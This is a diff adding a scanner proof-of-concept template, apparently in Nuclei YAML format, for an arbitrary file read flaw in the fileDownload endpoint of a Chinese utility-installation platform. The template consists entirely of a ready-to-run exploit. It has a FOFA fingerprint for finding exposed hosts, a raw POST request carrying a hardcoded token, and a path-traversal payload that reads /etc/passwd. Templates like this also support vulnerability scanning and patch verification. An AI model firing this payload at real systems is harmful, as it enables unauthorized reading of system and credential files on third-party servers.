@@ -1,0 +1,36 @@
+id: poc-vgpoh4f5mzpvghoo
+info:
+  name: 报装系统智能平台fileDownload存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vgpoh4f5mzpvghoo'
+  tags: lfi,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vgpoh4f5mzpvghoo
+    fofa: icon_hash=-1317284763
+http:
+- raw:
+  - 'POST /file/fileDownload HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip, deflate
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Accept: application/json, text/plain, */*
+
+    X-Token: 744cda3d-e26d-4555-abd6-125247165810
+
+    Content-Type: application/json;charset=UTF-8
+
+
+    {"filePath":"../../../../../../etc/passwd","fileName":""}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
